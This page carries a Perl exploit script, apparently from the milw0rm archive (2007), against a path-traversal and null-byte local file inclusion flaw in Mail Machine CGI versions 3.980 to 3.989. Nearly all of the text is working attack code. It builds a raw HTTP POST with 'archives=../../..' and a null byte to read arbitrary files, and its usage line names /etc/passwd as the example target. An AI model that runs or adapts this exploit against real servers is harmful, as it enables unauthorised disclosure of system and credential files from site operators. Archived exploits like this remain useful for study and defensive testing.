<html><head><title>Mail Machine <= 3.989 Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl -w

#__________________________________________________________________________

# [*] Mail Machine Local File Include Exploit
# [*] Vuln. v3.980, v3.985, v3.987, v3.988 and v3.989
# __________________________________________________________________________

# [!] Application homepage :   http://www.mikesworld.net/mailmachine.shtml
# [!] Author               :   H4 / Team XPK
# [!] Contact              :   H4_XPK@hotmail.com

# ---------------------------------------------------------------------

# Vuln. code:

# In mailmachine.cgi sub load { ...

# open() function is not properly sanitized against user supplied input

# ---------------------------------------------------------------------

# [!] This information got leaked long time ago, therefore we think that
#     everyone should have this information :)

# [!] Greetz to Angeldust &amp; Narcotics and Streets and to rest of community.

use strict;
use IO::Socket;

if(@ARGV&lt;1) { &amp;Usage; exit(0); }

my $host = 'h4x0red.com';
my $port = 80;
my $path = '/cgi-bin/mail/mailmachine.cgi';
my $file = &quot;$ARGV[0]&quot;;

sub Header()
{
 print &quot;*=====================================================================*\n&quot;;
 print &quot;    ----------------------------------------------------------------\n&quot;;
 print &quot;                  Mail Machine File Disclosure Exploit\n&quot;;
 print &quot;    ----------------------------------------------------------------\n&quot;;
 print &quot;*=====================================================================*\n&quot;;
 print &quot;                             Coded by H4\n\n&quot;;
}

Header();

print &quot;[*] Attacking $host ..\n\n&quot;;

my $sock = IO::Socket::INET-&gt;new( PeerAddr =&gt; $host, PeerPort =&gt; $port, Proto =&gt; 'tcp' ) || die &quot;[!] Unable to connect to $host\n&quot;;
my $post = &quot;action=Load&amp;archives=../../../../../../../../..$file%00&quot;;

my $send = &quot;POST $path HTTP/1.1\r\n&quot;;
$send .= &quot;Host: $host\r\n&quot;;
$send .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4\r\n&quot;;
$send .= &quot;Accept: text/html\r\n&quot;;
$send .= &quot;Connection: Keep-Alive\r\n&quot;;
$send .= &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;;
$send .= &quot;Content-length: &quot;.length($post).&quot;\r\n\r\n&quot;;
$send .= &quot;$post\r\n\r\n&quot;;

print $sock $send;

while ( my $line = &lt;$sock&gt; ) {
print &quot;$line&quot;;
}

close($sock);

sub Usage()
 {
  Header();
  print &quot;Usage : mailmachine3.pl filename\n&quot;;
  print &quot;------&gt; mailmachine3.pl /etc/passwd\n&quot;;
  print &quot;Do not forget edit host/path/port..\n&quot;;
}

# milw0rm.com [2007-07-10]</pre></html>